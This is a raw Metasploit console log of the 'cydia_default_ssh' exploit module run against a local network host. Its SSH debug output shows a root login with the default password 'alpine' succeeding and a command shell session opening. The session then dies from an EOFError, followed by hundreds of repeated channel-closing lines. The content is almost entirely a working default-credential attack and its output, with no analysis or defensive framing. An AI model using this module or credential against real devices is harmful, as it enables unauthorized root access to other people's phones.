msf exploit(cydia_default_ssh) > d, [2017-10-17t10:43:49.579728 #2469] debug -- net.ssh.transport.session[625a2c8]: connection established
i, [2017-10-17t10:43:49.580033 #2469] info -- net.ssh.transport.server_version[6254a80]: negotiating protocol version
d, [2017-10-17t10:43:49.580116 #2469] debug -- net.ssh.transport.server_version[6254a80]: local is `ssh-2.0-ruby/net::ssh_4.2.0 x86_64-linux'
d, [2017-10-17t10:43:49.857115 #2469] debug -- net.ssh.transport.server_version[6254a80]: remote is `ssh-2.0-openssh_6.7'
i, [2017-10-17t10:43:49.857786 #2469] info -- net.ssh.transport.algorithms[624d1a4]: sending kexinit
d, [2017-10-17t10:43:49.858309 #2469] debug -- socket[6256e84]: queueing packet nr 0 type 20 len 1164
d, [2017-10-17t10:43:49.858639 #2469] debug -- socket[6256e84]: sent 1168 bytes
d, [2017-10-17t10:43:49.878080 #2469] debug -- socket[6256e84]: read 832 bytes
d, [2017-10-17t10:43:49.878190 #2469] debug -- socket[6256e84]: received packet nr 0 type 20 len 828
i, [2017-10-17t10:43:49.878252 #2469] info -- net.ssh.transport.algorithms[624d1a4]: got kexinit from server
i, [2017-10-17t10:43:49.878375 #2469] info -- net.ssh.transport.algorithms[624d1a4]: negotiating algorithms
d, [2017-10-17t10:43:49.878496 #2469] debug -- net.ssh.transport.algorithms[624d1a4]: negotiated:
* kex: diffie-hellman-group14-sha1
* host_key: ssh-rsa
* encryption_server: aes128-ctr
* encryption_client: aes128-ctr
* hmac_client: hmac-sha1
* hmac_server: hmac-sha1
* compression_client: none
* compression_server: none
* language_client: * language_server: d, [2017-10-17t10:43:49.878526 #2469] debug -- net.ssh.transport.algorithms[624d1a4]: exchanging keys
d, [2017-10-17t10:43:49.884411 #2469] debug -- socket[6256e84]: queueing packet nr 1 type 30 len 268
d, [2017-10-17t10:43:49.884548 #2469] debug -- socket[6256e84]: sent 272 bytes
d, [2017-10-17t10:43:50.098075 #2469] debug -- socket[6256e84]: read 848 bytes
d, [2017-10-17t10:43:50.098333 #2469] debug -- socket[6256e84]: received packet nr 1 type 31 len 828
d, [2017-10-17t10:43:50.100973 #2469] debug -- socket[6256e84]: queueing packet nr 2 type 21 len 20
d, [2017-10-17t10:43:50.101186 #2469] debug -- socket[6256e84]: sent 24 bytes
d, [2017-10-17t10:43:50.101333 #2469] debug -- socket[6256e84]: received packet nr 2 type 21 len 12
d, [2017-10-17t10:43:50.102055 #2469] debug -- net.ssh.authentication.session[604f4ec]: beginning authentication of `root'
d, [2017-10-17t10:43:50.102451 #2469] debug -- socket[6256e84]: queueing packet nr 3 type 5 len 28
d, [2017-10-17t10:43:50.102577 #2469] debug -- socket[6256e84]: sent 52 bytes
d, [2017-10-17t10:43:50.160117 #2469] debug -- socket[6256e84]: read 52 bytes
d, [2017-10-17t10:43:50.160408 #2469] debug -- socket[6256e84]: received packet nr 3 type 6 len 28
d, [2017-10-17t10:43:50.160729 #2469] debug -- net.ssh.authentication.session[604f4ec]: trying password
d, [2017-10-17t10:43:50.161094 #2469] debug -- socket[6256e84]: queueing packet nr 4 type 50 len 60
d, [2017-10-17t10:43:50.161254 #2469] debug -- socket[6256e84]: sent 84 bytes
d, [2017-10-17t10:43:50.196139 #2469] debug -- socket[6256e84]: read 36 bytes
d, [2017-10-17t10:43:50.196403 #2469] debug -- socket[6256e84]: received packet nr 4 type 52 len 12
d, [2017-10-17t10:43:50.196580 #2469] debug -- net.ssh.authentication.methods.password[6047044]: password succeeded
[+] 192.168.1.xx:22 - login successful ('root:alpine)
d, [2017-10-17t10:43:50.199668 #2469] debug -- socket[6256e84]: queueing packet nr 5 type 90 len 44
d, [2017-10-17t10:43:50.200442 #2469] debug -- socket[6256e84]: sent 68 bytes
d, [2017-10-17t10:43:50.210514 #2469] debug -- socket[6256e84]: read 52 bytes
d, [2017-10-17t10:43:50.211015 #2469] debug -- socket[6256e84]: received packet nr 5 type 91 len 28
i, [2017-10-17t10:43:50.211231 #2469] info -- net.ssh.connection.session[60407f8]: channel_open_confirmation: 0 0 0 32768
i, [2017-10-17t10:43:50.211366 #2469] info -- net.ssh.connection.channel[6031348]: sending channel request "exec"
d, [2017-10-17t10:43:50.211706 #2469] debug -- socket[6256e84]: queueing packet nr 6 type 98 len 44
d, [2017-10-17t10:43:50.211971 #2469] debug -- socket[6256e84]: sent 68 bytes
d, [2017-10-17t10:43:50.231823 #2469] debug -- socket[6256e84]: read 88 bytes
d, [2017-10-17t10:43:50.232240 #2469] debug -- socket[6256e84]: received packet nr 6 type 93 len 28
i, [2017-10-17t10:43:50.232445 #2469] info -- net.ssh.connection.session[60407f8]: channel_window_adjust: 0 +2097152
d, [2017-10-17t10:43:50.232635 #2469] debug -- socket[6256e84]: received packet nr 7 type 99 len 12
i, [2017-10-17t10:43:50.232749 #2469] info -- net.ssh.connection.session[60407f8]: channel_success: 0
d, [2017-10-17t10:43:54.239996 #2469] debug -- socket[6256e84]: queueing packet nr 7 type 94 len 44
d, [2017-10-17t10:43:54.240571 #2469] debug -- socket[6256e84]: sent 68 bytes
d, [2017-10-17t10:43:54.288044 #2469] debug -- socket[6256e84]: read 68 bytes
d, [2017-10-17t10:43:54.288549 #2469] debug -- socket[6256e84]: received packet nr 8 type 94 len 44
i, [2017-10-17t10:43:54.288708 #2469] info -- net.ssh.connection.session[60407f8]: channel_data: 0 17b
[*] found shell.
[*] command shell session 1 opened (192.168.1.xx:xxxxx -> 192.168.1.xx:xx) at 2017-10-17 10:43:54 -0700
i, [2017-10-17t10:43:54.790213 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.790463 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.790812 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.790954 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.791084 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.791206 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.791329 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.791449 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.791685 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.791817 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.791943 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.792072 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.792203 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.792341 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.792471 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.792594 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.792725 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.792852 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.792985 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.793123 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.793256 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.793432 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.793578 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.793707 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.793845 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.793987 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.794118 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.794252 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.794391 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.794608 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.794760 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.794903 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.795043 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.795178 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.795317 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.795458 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.795589 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.795728 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.795865 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.796013 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.796147 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.796285 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.796423 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.796603 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.796750 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.796894 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.797035 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.797177 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.797325 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.797497 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.797646 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.797788 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.797938 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.798079 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.798262 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.798409 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.798578 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.798728 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.798909 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.799069 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.799218 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.799371 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.799524 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.799673 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.799829 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.800022 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.800171 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.800332 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.800492 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.800653 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.800810 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.800965 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.801119 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.801305 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.801480 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.801642 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.801797 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.801958 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.802155 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.802327 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.802488 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.802620 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.802699 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.802774 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.802853 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.802956 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.803036 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.803114 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.803192 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.803268 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.803350 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.803425 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.803505 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.803588 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.803669 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.803753 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.803859 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.803925 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.803992 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.804058 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.804128 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.804195 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.804262 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.804328 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.804394 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.804464 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.804556 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.804642 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.804728 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.804807 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.804860 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.804910 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.804960 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.805009 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.805060 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.805110 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.805199 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.805464 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.805531 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.805644 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.805704 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
[*] 192.168.1.xx - command shell session 1 closed
reason: died from eoferror
i, [2017-10-17t10:43:54.806176 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.806270 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.806318 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.806353 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.806386 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.806436 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.806469 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.806501 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.806569 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.806606 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.806640 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.806672 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.806723 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.806756 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.806789 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.806835 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.806881 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.806937 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.806982 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.807037 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.807105 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.807151 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.807197 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.807244 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.807292 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.807339 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.807403 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.807451 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.807497 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.807545 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.807605 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.807655 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.807705 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.807753 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.807818 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.807864 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.807899 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.807952 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.807989 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.808024 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.808062 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.808116 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.808154 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.808191 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.808228 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.808265 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.808303 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.808351 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.808389 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.808426 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.808487 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.808526 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.808565 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.808604 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.808643 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.808681 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.808732 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.808774 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.808814 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.808853 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.808900 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.808941 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.808988 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.809037 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.809078 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.809120 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.809163 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.809222 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.809264 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.809306 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.809350 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.809391 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.809433 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.809475 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.809527 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.809569 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.809612 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.809665 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.809709 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.809754 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.809797 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.809852 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.809898 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.809940 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.809995 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.810041 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.810085 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.810129 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.810173 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.810231 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.810276 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.810322 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.810379 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.810424 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.810470 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
i, [2017-10-17t10:43:54.810529 #2469] info -- net.ssh.connection.session[60407f8]: closing remaining channels (1 open)
